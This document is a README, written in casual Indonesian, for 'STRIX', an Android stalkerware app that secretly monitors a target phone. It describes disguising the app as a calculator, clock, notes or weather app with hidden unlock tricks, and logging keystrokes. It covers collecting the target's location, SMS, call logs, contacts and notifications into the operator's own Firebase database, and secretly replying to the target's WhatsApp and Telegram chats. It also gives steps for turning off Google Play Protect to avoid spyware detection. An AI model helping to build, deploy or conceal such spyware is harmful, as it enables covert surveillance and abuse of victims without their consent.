# STRIX 🦉

STRIX itu aplikasi Android 2-in-1 (bisa jadi yang mantau, bisa juga yang dipantau) buat ngetrack dan nyedot data HP target dari jarak jauh. Kerennya, aplikasi ini punya fitur **Mode Samaran (Stealth)** yang bikin icon dan daleman aplikasinya berubah 100% jadi aplikasi biasa (Kalkulator, Jam, Cuaca, atau Notes) biar target nggak curiga sama sekali!

## Fitur Mantul ✨

*   **Bisa Jadi Dua Peran:** Tinggal pilih mau HP ini jadi **Host** (Si Pemantau) atau **Client** (Target yang dipantau).
*   **Mode Penyamaran (Stealth):** Kalau dipasang di HP target, wujud aplikasinya bisa berubah total jadi:
    *   **Kalkulator:** Bisa dipake ngitung beneran.
    *   **Jam:** Layar jam digital asli.
    *   **Catatan:** Aplikasi nulis note biasa.
    *   **Cuaca:** Tampilan suhu cuaca.
*   **Cara Buka Sandi Rahasia:** Biar target nggak sengaja buka rahasia, menu aslinya cuma bisa kebuka kalau kamu tau triknya (misal: ngetik `8888` trus tekan `=` di kalkulator, atau teken tahan angka cuaca agak lama).
*   **Balas Pesan Diem-diem (Phantom Reply):** Sebagai Host, kamu bisa langsung balesin chat WhatsApp/Telegram yang masuk ke HP target dari jauh tanpa ketahuan!
*   **Nyedot Data Real-time:** Aplikasi ini otomatis ngirim rute Lokasi, SMS, Log Telpon, Kontak, Daftar Aplikasi, Info WiFi, rekaman ketikan keyboard (Keylogger), sampe isi semua Notifikasi target langsung ke database (Firebase) kamu.

## Cara Setting Server (Firebase) Sendiri ⚙️

Biar data target kamu aman dan masuk ke server pribadimu, mendingan bikin database Firebase sendiri. Gampang kok:

1.  Buka web [Firebase Console](https://console.firebase.google.com/) pake akun Google kamu, trus bikin *Project* baru.
2.  Nyalain 3 fitur penting ini: **Firestore Database** (pilih Test Mode), **Authentication** (nyalain Anonymous Mode), sama **Storage**.
3.  Daftarin aplikasi Android kamu di situ (masukin Package Name: `com.strix.safesync`).
4.  Download file sakti `google-services.json` dan taro di folder `app/` di proyek kamu ini.
5.  Atau kalau males ribet, buka aja aplikasi STRIX kamu, klik "Server Guide" di layar awal, masukin *App-Id* dan *Web-Api-Key* dari Firebase, kelar deh!

## Awas Kena Google Play Protect! ⚠️

**Penting nih:** Karena STRIX ini fungsinya agak "nyerempet", kerjanya sembunyi-sembunyi di belakang layar, dan pake izin akses berat (kayak Keylogger dan Lokasi), **Google Play Protect pasti bakal jelek-jelekin aplikasi ini sebagai Spyware/Malware.**

*   Biar HP target mau di-install, kamu **WAJIB** ke Play Store -> klik Profil -> **Play Protect** -> klik ikon gir (⚙️) -> **Matiin fitur "Scan apps with Play Protect"**.
*   Proyek ini cuma buat **Edukasi** atau pantau HP anak/adik yang emang udah janjian. Kalau dipakai buat hal aneh-aneh (nyadap pacar, dsb), risiko ditanggung penumpang ya, developernya nggak ikutan!

## Lisensi
MIT License bebas pakai 🍻
